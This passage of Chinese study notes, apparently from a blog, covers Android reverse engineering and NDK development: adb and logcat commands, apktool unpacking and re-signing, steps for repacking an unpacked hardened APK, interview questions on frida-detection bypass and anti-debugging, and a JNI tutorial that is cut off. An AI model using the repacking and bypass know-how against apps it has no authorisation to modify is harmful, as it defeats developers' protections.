class="variable">$(BUILD_FLAGS)</span> mou1.c</span><br><span class="line"></span><br><span class="line"><span class="section">mou2.obj:mou2.c mou2.h</span></span><br><span class="line"><span class="variable">$(CC)</span> <span class="variable">$(BUILD_FLAGS)</span> mou2.c</span><br><span class="line"></span><br><span class="line"><span class="section">notepad.obj:notepad.c</span></span><br><span class="line"><span class="variable">$(CC)</span> <span class="variable">$(BUILD_FLAGS)</span> notepad.c</span><br><span class="line"></span><br><span class="line">clean</span><br><span class="line">del *.obj</span><br></pre></td></tr></table></figure><ul><li>多用户编辑</li></ul><p><a href="http://xn--mou1-pe5fhb422wxhl.mk">新建两个mou1.mk</a> <a href="http://mou2.mk">mou2.mk</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">makefile中</span><br><span class="line"></span><br><span class="line">OBJECTS := *<span class="selector-class">.obj</span></span><br><span class="line">CC := cl</span><br><span class="line">BUILD_FLAGS := /c</span><br><span class="line">LINK_FLAGS := /OUT:notepad<span class="selector-class">.exe</span></span><br><span class="line"></span><br><span class="line">notepad<span class="selector-class">.exe</span>:mou1<span class="selector-class">.obj</span> mou2<span class="selector-class">.obj</span> notepad<span class="selector-class">.obj</span></span><br><span class="line">link $(LINK_FLAGS) $(OBJECTS)</span><br><span class="line"></span><br><span class="line">notepad<span class="selector-class">.obj</span>:notepad<span class="selector-class">.c</span></span><br><span class="line">$(CC) $(BUILD_FLAGS) notepad<span class="selector-class">.c</span></span><br><span class="line"></span><br><span class="line">include mou1<span class="selector-class">.mk</span></span><br><span class="line">include mou2<span class="selector-class">.mk</span></span><br><span class="line"></span><br><span class="line">clean</span><br><span class="line"><span class="selector-tag">del</span> *<span class="selector-class">.obj</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>mou1.mk中</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mou1<span class="selector-class">.obj</span>:mou1<span class="selector-class">.c</span> mou1<span class="selector-class">.h</span></span><br><span class="line">$(CC) $(BUILD_FLAGS) mou1<span class="selector-class">.c</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>mou2.mk中</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mou2<span class="selector-class">.obj</span>:mou2<span class="selector-class">.c</span> mou2<span class="selector-class">.h</span></span><br><span class="line">$(CC) $(BUILD_FLAGS) mou1<span class="selector-class">.c</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>Android目录</h1><ol><li><strong>data/data目录</strong><br>存放用户apk数据的目录，每个apk都有自己的目录，以包名命名，就是在data/data目录下，会产生一个跟Package一样的目录，这是一个私有目录，app只能访问各自的目录，除非root权限。</li><li><strong>data/app</strong><br>用户安装的app存放在这个目录下</li><li><strong>data/local/tmp</strong><br>临时目录，权限比较大</li><li><strong>system/app</strong><br>存放系统自带的app</li><li><strong>system/lib system/lib64</strong><br>存放app用到的so文件</li><li><strong>system/bin</strong><br>存放shell命令</li><li><strong>system/framework</strong><br>Android系统所用到的框架，如一些jar文件，XposedBridge.jar</li><li>sd卡目录，不管手机有没有存储卡都会有这个目录，app操作sd卡需要申请权限<br>/sdcard -&gt; /storage/self/primary<br>/mnt/sdcard<br>/storage/emulated/0</li></ol><h1>AndroidStudio工程目录结构</h1><p>gradle - &gt;  wrapper  - &gt;  gradle-wrapper.prperties  配置项目gr adle 版 本</p><p>build.gradle  描述工程整体的编译规则</p><p>gradle.properties  gradle配置文件，一般无须改动</p><p>local.properties 本机环境配置，SDK 、NDK 路径等 ，一般无须改动</p><p>settings. gradle  配置哪些模块在一 起编译    include  ’ : app ’ 只编译app</p><p>app - &gt; build.gradle  描述当前模块的编译规则</p><p>app - &gt;  build - &gt;  outputs - &gt;  apk - &gt;  debug/ release 生 成的apk的存放位置</p><p>app - &gt;  build - &gt;  intermediates - &gt;  cmake - &gt;  debug/ release - &gt;  obj生成的so存放位置</p><p>libs  模块中使用了第 三方 jar的时 候 ，会放这里</p><p>src - &gt;  main - &gt;  cpp   C/C ++ 代码</p><p>src - &gt;  main - &gt;  java   Java代码</p><p>src - &gt;  proguard- rules.proJava 代码混淆规则</p><p>res - &gt;  drawable  用来放图片</p><p>res - &gt;  layout  用来放布局文件</p><p>res - &gt;  mipmap-hdpi  用来放应用图片 ，不同屏幕的适 配 图标</p><p>res - &gt;  values    st r i ngs. xml 、 publ i c. xml</p><p>AndroidManifest.xml  清单文件，app的icon图标 、四大组件的注 册 、权限申请、指明程序入口</p><h1>adb常用命令</h1><p>adb help</p><p>adb version 显示adb版本和路径</p><p>adb start-server 启动server</p><p>adb kill-server 停止server</p><p>adb install -r xxx.apk 覆盖安装</p><p>adb uninstall 包名 卸载app</p><p>adb -s 设备名 shell 多设备时 指定设备</p><p>adb shell pm list package 显示包名</p><p>adb shell dumpsys activity top 查看手机当前界面的activity包路径</p><p>adb shell getprop ro.build.version.sdk 查看手机sdk版本</p><ul><li><p>这里直接安装会失败，这里的错误提示 <strong>INSTALL_FAILED_TEST_ONLY</strong> 表示是测试应用，所以这里安装需要指定一些参数才能安装 <code>adb install -g -t -r -d app-debug.apk</code></p></li><li><p>刷ro.debuggable=1</p><ul><li>magisk resetprop ro.debuggable 1  stop   start</li></ul></li></ul><h1>logcat常用命令</h1><p>adb logcat -help  帮助文档</p><p>adb logcat    常规显示</p><p>adb logcat -c 清除日志</p><p>adb logcat -g 显示缓冲区大小</p><p>adb logcat -G 256M 修改缓冲区大小</p><p>adb logcat -v time 设置不同显示格式</p><p>adb logcat -v color 颜色显示</p><p>adb logcat -s 标签 过滤tag</p><p>adb install --abi armeabi-v7a xxx.apk</p><p>adb logcat |tee -a a.txt 日志显示到屏幕且写入txt中</p><p>ps -A | grep 进程名 先获取进程pid<br>adb logcat | findstr pid</p><p>adb shell dumpsys window | <a href="https://so.csdn.net/so/search?q=grep&amp;spm=1001.2101.3001.7020">grep</a> - i mCurrentFocus 找到当前运行状态下app的进程名</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb tcpid <span class="number">5555</span></span><br><span class="line">adb connect 手机ip </span><br><span class="line"><span class="comment">//这样就可以不用连数据线了</span></span><br></pre></td></tr></table></figure><p>adb shell dumpsys window |grep mCurrentFocus 查看顶端前台应用的包名和activity名</p><p>dumpsys activity top</p><h1>其他常用命令</h1><p>pm -l 列出包名</p><p>pm -l | grep xx 调出包含 xx的结果</p><p>aapt dump badging apk名称 查看apk文件的详细信息</p><p>ps -e | grep package 查看指定包的进程号</p><p>ps aux |grep -i xxx  显示进程信息</p><p>知道进程号可以进入进程号的路径下 cd /proc/进程号</p><p>cat status下有一个 TracePid</p><p>am start-activity package  启动app</p><p>pm uninstall package 卸载</p><h1>apktool</h1><p><code>apktool d apk名字</code>  进行apk解包</p><p><code>apktool b ./app-debug/ </code> 进行重打包(app-debug/下是apk文件的基本组成结构)</p><ul><li>进行重打包时 需要进行签名</li></ul><ol><li>生成证书   可以下载kse，运行kse.sh对证书进行查看</li></ol><p><code>keytool -genkeypair -alias mysigner -keyalg RSA -validity 40000 -keystore android.keystore</code></p><ol start="2"><li>使用命令查看app是否需要签名<br><code>apksigner verify -v --print-certs --in app名称</code></li><li>使用证书进行签名<br><code>apksigner sign --ks android.keystore --ks-key-alias mysigner --out 自定义一个apk名称 原先app名称</code></li></ol><p>第二中签名命令</p><p><code>keytool -genkey -alias abc.keystore -keyalg RSA -validity 2000 -keystore abc,key</code></p><p><code>jarsigner -verbose -keystore abc.keystore -signedjar xxx_patch.apk xxx.apk abc.keystore</code></p><p><strong>当对加固的apk进行重打包时</strong></p><ol><li>重打包时应该使用脱壳后原始apk的dex替换掉原来的壳dex</li><li>app在加固后的入口点变为壳的入口点，因此在重打包后还需要修改AndroidManifest.xml入口类</li></ol><p><em>具体命令如下</em></p><ol><li>apktool d xxx.apk -s 然后删除原始dex，并将脱壳后dex按文件大小依次命名classes.dex,classes2.dex</li><li>jadx打开包含管件类的dex文件 并搜索extends Application的代码，定位关键类，将反编译结果目录下AndroidManifest.xml清单文件内<Application>结点的android：name对应的值修改为找到的完整类名</li><li>对反编译后目录 apktool b xxx.apk 然后签名正常运行</li><li>然后再反编译修改smail 再打包签名即可实现功能</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h2 id="同程">同程</h2><p>fart原理</p><p>如何检测fart</p><p>脱壳原理</p><p>僵尸进程</p><p>线程进程区别</p><p>http为什么用TCP</p><p>http没有状态为什么还能辨别他</p><p>当你输入一个网址怎么传到服务端</p><p>项目</p><p>列和表区别</p><p>mysql和sql区别</p><p>app加载出列表为啥抓包工具没有数据</p><p>抓包 https是怎么解密的</p><p>抓不到包</p><p>frida检测点</p><p>frida绕过</p><p>ollvm</p><p>unidbg优点</p><p>多线程为什么还用多进程</p><p>访问网页状态码 400 能hook改值 为什么还要有这个400呢</p><p>多进程之间通信方式</p><p>线程死锁</p><h2 id="某AI面试">某AI面试</h2><p>sql漏洞的根源及防护手段</p><p>app渗透的基本步骤</p><p>渗透测试的步骤</p><p>密码学的应用场景</p><h2 id="去哪">去哪</h2><p>方法被混淆如何找到他的偏移地址</p><p>分析抓包流程</p><p>hook方式</p><p>frida打印所有classloader</p><p>检验got hook</p><h2 id="mt">mt</h2><p>抓不到包</p><p>参数被加密了，如何定位加密的地方  参数在so中呢</p><p>参数加密复杂 动调</p><p>ollvm原理</p><p>frida原理</p><p>反调试</p><p>frida绕过</p><p>arm调用</p><p>arm汇编 b bl</p><p>unidbg补环境</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>NDK</h1><p>linker：自定义的so解析系统，可以用自定义的linker系统来解析修改so结构的so文件</p><p>CMake：一款外部构建工具。指导so编译</p><p>LLDB：AndroidStudio用于调式原生代码的调试程序</p><p>NDK ,CMake 、 LLDB的作用：<a href="https://developer.android.com/ndk/guides">https://developer.android.com/ndk/guides</a></p><p>ABI与指令集：<a href="https://developer.android.com/ndk/guides/abis">https://developer.android.com/ndk/guides/abis</a></p><h2 id="NDK与Java工程的区别">NDK与Java工程的区别</h2><ul><li><p>Java代码中加载so和声明所需要使用的so中的函数</p></li><li><p>编写CMakeLists.txt和C文件</p></li><li><p>build.gradle中添加一些代码</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">defaultConfig</span> &#123;</span><br><span class="line">       。。。。。。</span><br><span class="line">        <span class="keyword">externalNativeBuild</span> &#123;</span><br><span class="line">            <span class="keyword">cmake</span> &#123;</span><br><span class="line">                cppFlags &#x27;<span class="operator">-</span>std<span class="operator">=</span>c<span class="operator">++</span><span class="number">11</span>&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">ndk</span>&#123;</span><br><span class="line">        abiFilters&#x27;armeabi<span class="operator">-</span>v7a<span class="string">&#x27;,&#x27;</span>arm64<span class="operator">-</span>v8a<span class="string">&#x27;,&#x27;</span>x86<span class="string">&#x27;,&#x27;</span>x86_64&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">externalNativeBuild</span> &#123;</span><br><span class="line">        <span class="keyword">cmake</span> &#123;</span><br><span class="line">            path file(<span class="symbol">&#x27;src</span><span class="operator">/</span>main<span class="operator">/</span>cpp<span class="operator">/</span>CMakeLists.txt&#x27;)</span><br><span class="line">            version &#x27;<span class="number">3.22</span><span class="number">.1</span>&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="assets/image-20240327192718501.png" alt="image-20240327192718501"></p><p><strong>add_definitions(“-fvisibility=hidden”)</strong> 去掉符号表</p><p><code>__attribute((__annotate__(&quot;fla&quot;))</code>对指定函数fla混淆</p><p><code>__attribute__((visibility(&quot;default&quot;)))</code>显示在导出表中</p><h2 id="第一个NDK工程">第一个NDK工程</h2><ul><li><p>native函数的声明<br>声明形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure></li><li><p>JNI函数的静态注册规则<br>静态注册后函数名字为：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java_包名<span class="literal">_</span>类名<span class="literal">_</span>函数名</span><br></pre></td></tr></table></figure></li><li><p>extern “C” JNIEXPORT jstring JNICALL<br>extern  “C” ==&gt; 以编译c代码的形式来编译，防止加上其他的修饰符，符号等。<br>JNIEXPORT ==&gt; <strong>attribute</strong> ((visibility (“default”))) 让函数名在导出表中出现，静态注册名字一定要出现在导出表<br>jstring ==&gt; 返回值</p></li><li><p>指定编译后so的名字</p><p>修改如下位置即可：<br><img src="assets/image-20240204144200776.png" alt="image-20240204144200776"></p></li></ul><p><img src="assets/image-20240204144230665.png" alt="image-20240204144230665"></p><p><img src="assets/image-20240204144308333.png" alt="image-20240204144308333"></p><h2 id="so中常用的Log输出">so中常用的Log输出</h2><p>在AS中，在.cpp文件中可以通过以下形式进行输出：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">头文件：</span><br><span class="line">#include &lt;android/<span class="keyword">log</span>.h&gt;</span><br><span class="line"></span><br><span class="line">#define <span class="built_in">TAG</span> <span class="string">&quot;zxk1ng&quot;</span> </span><br><span class="line">#define LOGD(<span class="params">...</span>) __android_log_print(ANDROID_LOG_DEBUG, <span class="built_in">TAG</span>, __VA_ARGS__) ; </span><br><span class="line">#define LOGI(<span class="params">...</span>) __android_log_print(ANDROID_LOG_INFO, <span class="built_in">TAG</span>, __VA_ARGS__) ; </span><br><span class="line">#define LOGE(<span class="params">...</span>) __android_log_print(ANDROID_LOG_ERROR, <span class="built_in">TAG</span>, __VA_ARGS__);</span><br><span class="line"></span><br><span class="line">LOGD(<span class="string">&quot;JNI_native_xxx %d %d&quot;</span>,<span class="number">100</span>,<span class="number">200</span>);</span><br><span class="line">等价于</span><br><span class="line">__android_log_print(ANDROID_LOG_DEBUG,<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;JNI_native_xxx %d %d&quot;</span>,<span class="number">100</span>,<span class="number">200</span>);</span><br></pre></td></tr></table></figure><h2 id="JNI-OnLoad的定义">JNI_OnLoad的定义</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">JNIEXPORT jint <span class="title function_">JNI_OnLoad</span><span class="params">(JavaVM *vm,<span class="keyword">void</span> *reserved)</span>&#123;</span><br><span class="line">    JNIEnv *env = nullptr;</span><br><span class="line">    <span class="keyword">if</span>(vm-&gt;GetEnv((<span class="keyword">void</span> **)&amp;env,JNI_VERSION_1_6)!=JNI_OK)&#123;</span><br><span class="line">        LOGD(<span class="string">&quot;GetEnv failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6; <span class="comment">//返回jni版本值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个so中可以不定义JNI_OnLoad，一旦定义了JNI_OnLoad，在so被加载的时候会自动执行</p><p>必须返回JNI版本，JNI_VERSION_1_6</p><h2 id="JavaVM">JavaVM</h2><p>JavaVM每个进程中只有一份</p><p>JavaVM是一个结构体，其中有两个重要成员</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//子线程获得env环境 </span></span><br><span class="line">jint <span class="title function_">AttachCurrentThread</span><span class="params">(JNIEnv** p_env, <span class="keyword">void</span>* thr_args)</span></span><br><span class="line">  &#123; <span class="keyword">return</span> functions-&gt;AttachCurrentThread(<span class="built_in">this</span>, p_env, thr_args); &#125;</span><br><span class="line"><span class="comment">//主线程中获得env环境    </span></span><br><span class="line">jint <span class="title function_">GetEnv</span><span class="params">(<span class="keyword">void</span>** env, jint version)</span></span><br><span class="line">  &#123; <span class="keyword">return</span> functions-&gt;GetEnv(<span class="built_in">this</span>, env, version); &#125;</span><br></pre></td></tr></table></figure><h3 id="JavaVM获取方式">JavaVM获取方式</h3><p>1）JNI_OnLoad和JNI_OnUnLoad的第一个参数</p><p>2）env-&gt;GetJavaVM</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">JNIEXPORT </span><span class="keyword">jint </span><span class="keyword">JNI_OnLoad(JavaVM* </span>vm, void* reserved);</span><br><span class="line"><span class="keyword">JNIEXPORT </span>void <span class="keyword">JNI_OnUnload(JavaVM* </span>vm, void* reserved);</span><br><span class="line"></span><br><span class="line"><span class="keyword">JavaVM </span>*<span class="keyword">jvm;</span></span><br><span class="line"><span class="keyword"></span>env-&gt;GetJavaVM(&amp;<span class="keyword">jvm);</span></span><br><span class="line"><span class="keyword"></span>LOGD(<span class="string">&quot;JavaVM: %p&quot;</span>,<span class="keyword">jvm);</span></span><br></pre></td></tr></table></figure><h2 id="JNIEnv">JNIEnv</h2><p>JNIEnv每个线程中都有一份</p><h3 id="JNIEnv获取">JNIEnv获取</h3><ul><li>函数静态/动态注册传的第一个参数</li><li>vm-&gt;GetEnv</li><li>globalVM-&gt;AttachCurrentThread 子线程获得env</li></ul><h2 id="SO函数注册">SO函数注册</h2><p>1）JNI函数的静态注册必须遵循一定的命名规则，一 般 是 Java_包 名 _ 类名 _ 方法名</p><p>系统会通过dlopen加载对应的so，通过dlsym来获取指定名字的函数地址，然后调用静态注册的jni函数， 静态注册函数必然在导出表里</p><p>2）JNI函数的动态注册通过 env-&gt;RegisterNatives 注册函数，通常在 JNI_OnLoad中注册。</p><p>JNINativeMethod  结构体 内容如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* name;   java层函数名</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* signature;  函数签名 由参数类型返回类型决定</span><br><span class="line">    <span class="type">void</span>*       fnPtr;   函数指针</span><br><span class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure><p>可以给<strong>同一个Java函数</strong>注册多个native函数，以最后一次为准</p><p>一个简单的动态注册例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//.java中调用和声明</span></span><br><span class="line">Log.d(<span class="string">&quot;zxk1ng&quot;</span>,encodeFromC(<span class="string">&quot;java&quot;</span>,<span class="number">100</span>,<span class="number">64412923.</span>getBytes()));</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI2</span><span class="params">(String a,<span class="type">int</span> b,<span class="type">byte</span>[] c)</span>;</span><br><span class="line"><span class="comment">//.cpp中</span></span><br><span class="line">jstring <span class="title function_">encodeFromC</span><span class="params">(JNIEnv *env,jobject,jstring,jint,jbyteArray)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">&quot;zxk1ng&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">jclass</span> <span class="variable">MainActivityClazz</span> <span class="operator">=</span> env-&gt;FindClass(<span class="string">&quot;com/example/ndk_demo/MainActivity&quot;</span>); JNINativeMethod methods[] = &#123; </span><br><span class="line">  <span class="comment">//public native String encode(int i,String str,byte[] byt); </span></span><br><span class="line">  &#123;<span class="string">&quot;stringFromJNI2&quot;</span>,<span class="string">&quot;(Ljava/lang/String;I[B)Ljava/lang/String;&quot;</span>, (<span class="keyword">void</span> *)encodeFromC&#125;, </span><br><span class="line">&#125;; </span><br><span class="line">env-&gt;RegisterNatives(MainActivityClazz,methods,sizeof(methods)/sizeof(JNINativeMethod)</span><br><span class="line"></span><br><span class="line"><span class="comment">//RegisterNatives结构如下：                    </span></span><br><span class="line">jint <span class="title function_">RegisterNatives</span><span class="params">(jclass clazz, const JNINativeMethod* methods,jint nMethods)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="多个cpp文件编译成一个so">多个cpp文件编译成一个so</h2><p>只需要修改CMakeLists.txt<img src="assets/image-20240204191525854.png" alt="image-20240204191525854"></p><ul><li>两个cpp函数如何相互使用–在同一个so文件下<br>首先在一个cpp中声明函数，才能使用另一个cpp的函数。</li></ul><h2 id="编译多个so文件">编译多个so文件</h2><p>多个so肯定对应多个cpp文件</p><p>编译多个so只需要添加如下：<br><img src="assets/image-20240204194227976.png" alt="image-20240204194227976"></p><p><img src="assets/image-20240204194330575.png" alt="image-20240204194330575"></p><h2 id="so路径的动态获取">so路径的动态获取</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Log.d(<span class="string">&quot;zxk1ng&quot;</span>,getPath(getApplicationContext()));</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getPath</span><span class="params">(Context cxt)</span>&#123;</span><br><span class="line">    <span class="type">PackageManager</span> <span class="variable">pm</span> <span class="operator">=</span> cxt.getPackageManager(); </span><br><span class="line">    List&lt;PackageInfo&gt; pkgList = pm.getInstalledPackages(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(pkgList == <span class="literal">null</span> || pkgList.size() == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span>(PackageInfo pi : pkgList)&#123;</span><br><span class="line">        <span class="keyword">if</span> (pi.applicationInfo.nativeLibraryDir.startsWith(<span class="string">&quot;/data/app/&quot;</span>) &amp;&amp; pi. packageName.startsWith(<span class="string">&quot;com.example.ndk_demo&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> pi.applicationInfo.nativeLibraryDir;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="so之间的相互调用–dlopen-dlsym">so之间的相互调用–dlopen dlsym</h2><p>在获取到so路径前提下，使用dlopen加载加载这个so文件路径</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java文件中</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">       ......</span><br><span class="line">        String path=getPath(getApplicationContext())+<span class="string">&quot;/libxiaojianbangB.so&quot;</span>;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,getPath(getApplicationContext()));</span><br><span class="line">  ......</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">stringFromJNI</span><span class="params">(String path)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getPath</span><span class="params">(Context cxt)</span>&#123;</span><br><span class="line">        <span class="type">PackageManager</span> <span class="variable">pm</span> <span class="operator">=</span> cxt.getPackageManager();</span><br><span class="line">        List&lt;PackageInfo&gt; pkgList = pm.getInstalledPackages(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(pkgList == <span class="literal">null</span> || pkgList.size() == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span>(PackageInfo pi : pkgList)&#123;</span><br><span class="line">            <span class="keyword">if</span> (pi.applicationInfo.nativeLibraryDir.startsWith(<span class="string">&quot;/data/app/&quot;</span>) &amp;&amp; pi. packageName.startsWith(<span class="string">&quot;com.example.ndk_demo&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> pi.applicationInfo.nativeLibraryDir;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//cpp文件中</span></span><br><span class="line">extern <span class="string">&quot;C&quot;</span> JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="title function_">Java_com_example_ndk_1demo_MainActivity_stringFromJNI</span><span class="params">(</span></span><br><span class="line"><span class="params">        JNIEnv* env,</span></span><br><span class="line"><span class="params">        jobject <span class="comment">/* this */</span>,jstring path)</span> &#123;</span><br><span class="line">    std::<span class="type">string</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="string">&quot;Hello from C++&quot;</span>;</span><br><span class="line">    const <span class="type">char</span> *cPath = env-&gt;GetStringUTFChars(path,nullptr);</span><br><span class="line">    <span class="keyword">void</span> *soinfo = dlopen(cPath,RTLD_NOW );</span><br><span class="line">    <span class="keyword">void</span> (*ref)();   <span class="comment">//函数指针</span></span><br><span class="line">    ref=reinterpret_cast&lt;<span class="keyword">void</span> (*) () &gt;(dlsym(soinfo,<span class="string">&quot;fromSoB&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(ref==nullptr)&#123;</span><br><span class="line">        LOGD(<span class="string">&quot;ref if null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ref(); <span class="comment">//调用</span></span><br><span class="line">    dlclose(soinfo); <span class="comment">//关闭so</span></span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(hello.c_str());<span class="comment">//.c_str：c++字符串转化c字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="so之间相互调用–不同so文件里的函数相互调用">so之间相互调用–不同so文件里的函数相互调用</h2><p>CMakeLists做如下修改</p><p><img src="assets/image-20240204224426093.png" alt="image-20240204224426093"></p><p>说明libdemo.so文件中的函数将要在libndk_demo.so中被调用使用</p><h2 id="通过jni创建Java对象">通过jni创建Java对象</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 